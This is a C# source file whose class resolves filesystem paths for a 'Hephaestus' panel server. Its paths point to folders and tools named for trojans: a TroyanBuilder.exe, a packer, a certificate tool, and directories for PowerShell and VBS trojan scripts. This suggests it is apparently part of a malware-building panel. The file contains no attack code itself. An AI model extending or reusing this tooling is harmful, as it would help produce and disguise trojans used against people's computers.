using model;

namespace Commons;

/// <summary>Panel filesystem layout derived from <see cref="IHephaestusPathResolver"/>; panel server homes use a fixed OS path (<see cref="RootData"/>).</summary>
public sealed class PanelServerPaths : IPanelServerPaths
{
    private readonly IHephaestusPathResolver _resolver;

    public PanelServerPaths(IHephaestusPathResolver resolver) => _resolver = resolver;

    private static string StartDir => Path.GetFullPath(AppContext.BaseDirectory);

    public string HephaestusDataRoot => _resolver.ResolveHephaestusDataRoot(StartDir);

    /// <summary>Windows: <c>C:\data</c>. Linux and others: <c>/var/lib/hephaestus/data</c>.</summary>
    public string RootData => Path.GetFullPath(OperatingSystem.IsWindows() ? @"C:\data" : "/var/lib/hephaestus/data");

    public string RootDir => _resolver.ResolveRepositoryRoot(StartDir);

    public string SourceCertDir => _resolver.CertDirectory(HephaestusDataRoot);

    public string HephaestusTlsPfxPath => _resolver.FileUnderCert(HephaestusDataRoot);

    public string CpDir => Path.Combine(RootDir, "cp");

    public string AdsDir => Path.Combine(RootDir, "ads");

    public string PhpDir => Path.Combine(RootDir, "php");

    public string CertDir => Path.Combine(RootDir, "cert");

    public string SysDir => Path.Combine(RootDir, "sys");

    public string TroyanDir => Path.Combine(RootDir, "troyan");

    public string TroyanScriptDir => Path.Combine(TroyanDir, "troyanps");

    public string TroyanVbsDir => Path.Combine(TroyanDir, "troyanvbs");

    public string TroyanBuilder
    {
        get
        {
            var result = Path.Combine(RootDir, "output", "TroyanBuilder.exe");
            if (!File.Exists(result))
                result = Path.Combine(CpDir, "TroyanBuilder.exe");
            return result;
        }
    }

    public string Packer
    {
        get
        {
            var result = Path.Combine(RootDir, "output", "packer.exe");
            if (!File.Exists(result))
                result = Path.Combine(CpDir, "packer.exe");
            return result;
        }
    }

    public string CertTool
    {
        get
        {
            var result = Path.Combine(RootDir, "output", "certtool.exe");
            if (!File.Exists(result))
                result = Path.Combine(CpDir, "certtool.exe");
            return result;
        }
    }

    public string ServerDir => Path.Combine(RootData, PanelServerIdentity.DefaultKey);

    public string DataFile => Path.Combine(ServerDir, "server.json");

    public string UserDataDir => ServerDir;

    public string UserDataFile(string file) => Path.Combine(UserDataDir, file);

    public string UserDataBody => UserDataFile("body.txt");
}
